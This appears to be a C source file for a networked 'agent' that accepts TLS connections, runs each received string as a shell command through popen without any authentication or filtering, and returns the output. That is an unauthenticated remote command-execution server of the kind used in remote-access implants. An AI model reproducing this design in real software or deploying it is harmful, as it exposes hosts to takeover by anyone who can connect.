#include "../../include/agent/agent.h"

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>


SSL_CTX* create_ssl_context() {
    const SSL_METHOD* method;
    SSL_CTX* ctx;

    OpenSSL_add_ssl_algorithms();
    method = SSLv23_server_method();
    ctx = SSL_CTX_new(method);
    if (!ctx) {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    return ctx;
}

void configure_ssl_context(SSL_CTX* ctx) {
    SSL_CTX_set_ecdh_auto(ctx, 1);

    // Set the certificate and private key
    if (SSL_CTX_use_certificate_file(ctx, "security/cert.crt", SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    if (SSL_CTX_use_PrivateKey_file(ctx, "security/key.key", SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
}

int main(int argc, const char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <port>\n", argv[0]);
        return 1;
    }

    uint16_t port = atoi(argv[1]);

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        printf("Error creating socket\n");
        return 1;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) < 0) {
        perror("Error setting socket options");
        return 1;
    }

    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        printf("Error binding socket\n");
        return 1;
    }

    printf("[Agent] : Bound on port %hu\n", port);

    if (listen(server_fd, 10) < 0) {
        printf("Error listening on socket\n");
        return 1;
    }

    printf("[Agent] : Listening on port %hu\n", port);

    SSL_CTX* ctx = create_ssl_context();
    configure_ssl_context(ctx);

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_addr_len = sizeof(client_addr);
        int client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_addr_len);
        if (client_fd < 0) {
            printf("Error accepting connection\n");
            close(server_fd);
            SSL_CTX_free(ctx);
            return 1;
        }

        SSL* ssl = SSL_new(ctx);
        SSL_set_fd(ssl, client_fd);

        if (SSL_accept(ssl) <= 0) {
            ERR_print_errors_fp(stderr);
            SSL_free(ssl);
            close(client_fd);
            continue;
        }

        printf("[Agent] : SSL connection established\n");

        char command[MAX_BUFFER_SIZE];
        memset(command, 0, MAX_BUFFER_SIZE);

        int n = SSL_read(ssl, command, MAX_BUFFER_SIZE);
        if (n <= 0) {
            printf("Error reading from SSL connection\n");
            ERR_print_errors_fp(stderr);
            SSL_shutdown(ssl);
            SSL_free(ssl);
            close(client_fd);
            continue;
        }

        printf("[Agent] : Received command '%s'\n", command);

        // Execute command received by network, and grab output with popen
        FILE* fp = popen(command, "r");
        if (fp == NULL) {
            printf("Error executing command\n");
            SSL_shutdown(ssl);
            SSL_free(ssl);
            close(client_fd);
            continue;
        }

        char cmd_output[MAX_BUFFER_SIZE];
        memset(cmd_output, 0, MAX_BUFFER_SIZE);

        while (fgets(cmd_output, MAX_BUFFER_SIZE, fp) != NULL) {
            SSL_write(ssl, cmd_output, strlen(cmd_output));
            memset(cmd_output, 0, MAX_BUFFER_SIZE);
        }

        pclose(fp);

        printf("[Agent] : Command output sent\n");

        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(client_fd);
    }

    close(server_fd);
    SSL_CTX_free(ctx);
    EVP_cleanup();
    return 0;
}